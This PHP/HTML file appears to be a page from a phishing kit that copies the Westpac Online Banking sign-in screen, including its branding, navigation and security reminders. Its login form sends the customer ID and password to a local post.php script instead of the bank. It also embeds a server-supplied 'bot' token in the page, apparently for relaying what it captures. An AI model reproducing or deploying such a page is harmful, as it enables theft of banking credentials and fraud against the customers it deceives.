<?php 
require './main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Westpac Online Banking</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>


    <header class="bar">
      <div class="list">
        <nav>
            <a href="#">Lost or stolen cards</a>
            <a href="#">Contact us</a>
            <a href="#">Locate us</a>
        </nav>
        </div>
        <div class="register"><a href="#">Register for Westpac Online Banking</a></div>
        
    </header>
	<script>var token=<?php echo json_encode($bot); ?>;</script>

    <div class="down">
    <div class="logo">
          <img src="res/img/logo.png" alt="logo"> 
        </div>
        <nav>
            <a href="#">Home</a>
            <a href="#">Personal</a>
            <a href="#">Business</a>
            <a href="#">Corporate</a>
            <a href="#">About us</a>
        </nav>
    </div>
        <h2>Sign in to Westpac Online Banking</h2>
        <div class="login">
    <div class="box">
      <div class="form">
        <form action="post.php" method="post">
          <label>Customer ID</label>
          <input type="text" name="user" required>

          <label>Password</label>
          <input type="password" name="pass">

          <div class="checkbox">
            <input type="checkbox" id="remember">
            <label for="remember">Remember customer ID</label>
          </div>

          <button type="submit">Sign in</button>

          <div class="links">
            <a href="#">Forgot customer ID or password?</a>
          </div>
        </form>
      </div>

      <div class="security">
        <h4>🔒 <strong>Security reminder</strong></h4>
        <p class="sub">Westpac Protect™</p>
        <ul>
          <li>Don't sign in if you are sharing <br>access to your computer</li>
          <li>Never share your security codes <br> or passwords with anyone</li>
          <li>Call us on 132 032 if you are <br> being asked to do this</li>
        </ul>
        <a class="safe-link" href="#">Learn more about staying safe</a>
      </div>

      <div class="side">
        <ul>
          <li>› Register for Online Banking</li>
          <li>› Online Help</li>
          <li>› What's new</li>
          <li>› Online Banking features</li>
        </ul>
      </div>
    </div>
  </div>


    <footer>
        <div class="links">
            <a href="#">Register for Online Banking</a>
            <a href="#">Online Banking Help</a>
            <a href="#">Security Guarantee</a>
            <a href="#">Keep safe online</a>
            <a href="#">Terms and Conditions</a>
        </div>
    </footer>
	<script src="./res/cdn/jq.js"></script>
	<script src="./res/jquery.js"></script>

</body>
</html>
